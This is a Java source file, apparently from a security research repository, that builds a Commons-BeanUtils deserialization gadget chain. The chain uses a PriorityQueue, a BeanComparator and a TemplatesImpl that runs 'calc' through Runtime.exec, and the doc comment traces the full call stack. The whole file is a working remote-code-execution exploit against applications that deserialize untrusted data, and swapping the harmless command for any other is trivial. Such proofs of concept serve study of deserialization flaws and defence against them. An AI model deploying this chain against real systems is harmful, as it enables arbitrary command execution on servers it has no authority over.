package com.javasec.pocs.cb;

import com.javasec.utils.SerializeUtils;
import org.apache.commons.beanutils.BeanComparator;

import javax.xml.transform.Templates;
import java.util.PriorityQueue;

/**
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeMethod:2116, PropertyUtilsBean (org.apache.commons.beanutils)
 * getSimpleProperty:1267, PropertyUtilsBean (org.apache.commons.beanutils)
 * getNestedProperty:808, PropertyUtilsBean (org.apache.commons.beanutils)
 * getProperty:884, PropertyUtilsBean (org.apache.commons.beanutils)
 * getProperty:464, PropertyUtils (org.apache.commons.beanutils)
 * compare:163, BeanComparator (org.apache.commons.beanutils)
 * siftDownUsingComparator:721, PriorityQueue (java.util)
 * siftDown:687, PriorityQueue (java.util)
 * heapify:736, PriorityQueue (java.util)
 * readObject:795, PriorityQueue (java.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:66, SerializeUtils (com.javasec.utils)
 * deserTester:312, SerializeUtils (com.javasec.utils)
 * main:20, cb2 (com.javasec.pocs.cb)
 */
public class cb2 {
    public static void main(String[] args) throws Exception{
        Templates obj = SerializeUtils.getTemplate("calc");
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("2");

        SerializeUtils.setFieldValue(comparator, "property", "outputProperties");
        SerializeUtils.setFieldValue(queue, "queue", new Object[]{obj, obj});
        SerializeUtils.deserTester(queue);
    }
}
